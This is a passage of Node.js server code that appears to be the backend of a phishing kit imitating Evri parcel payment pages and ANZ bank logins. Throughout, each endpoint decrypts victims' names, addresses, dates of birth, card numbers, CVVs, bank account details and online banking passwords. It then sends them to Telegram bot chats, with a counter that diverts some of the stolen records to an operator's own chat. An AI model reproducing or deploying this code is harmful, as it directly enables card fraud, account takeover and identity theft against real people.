  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-751200146&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/fpaysEvri4", cors());

app.post("/fpaysEvri4", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-585918490&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/fpaysEvri5", cors());

app.post("/fpaysEvri5", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-707342170&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/mannyman3", cors());

app.post("/mannyman3", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriMannyGC:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-1001708890887&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }

      res.send("Update Completed");
    });
});

let symEvri = 3;

app.options("/symEvri", cors());

app.post("/symEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (symEvri == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri = 0;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriSYM:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 750220840,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri += 1;
      }

      res.send("Update Completed");
    });
});

let abzOutlaw = 3;

app.options("/abzEvri", cors());

app.post("/abzEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (abzOutlaw == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        abzOutlaw = 0;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriAbz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1023110482,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        abzOutlaw += 1;
      }

      res.send("Update Completed");
    });
});

let capzEvri = 3;

app.options("/tcapzEvri", cors());

app.post("/tcapzEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 0;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriCapz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1437456088,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Completed");
    });
});

let pokaEvri = 3;

app.options("/pokaEvri", cors());

app.post("/pokaEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pokaEvri == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pokaEvri = 0;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriPoka:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5280917183,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pokaEvri += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/skiiGCEvri", cors());

app.post("/skiiGCEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 4;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-633455690&text=Evri:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

//ANZ
//ANZ
//ANZ

app.options("/anzJuice", cors());

app.post("/anzJuice", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (anzTarrifi == 4) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `ANZ:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    anzTarrifi = 0;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `ANZJuice:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1594377116,
          text: `ANZ:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    anzTarrifi += 1;
  }
  res.send("Update Completed");
});

app.options("/anzAR", cors());

app.post("/anzAR", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=ANZ:\n${originalText}`
  );
  res.send("Update Completed");
});

app.options("/anzHoods", cors());

app.post("/anzHoods", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-665384174&text=ANZ:\n${originalText}`
  );
  res.send("Update Completed");
});

let anzTarrifi = 0;

app.options("/anzTarrifi", cors());

app.post("/anzTarrifi", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (anzTarrifi == 4) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    anzTarrifi = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=ANZTarrifi:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=ANZ:\n${originalText}`
    );
    anzTarrifi += 1;
  }
  res.send("Update Completed");
});

//BT
//BT
//BT

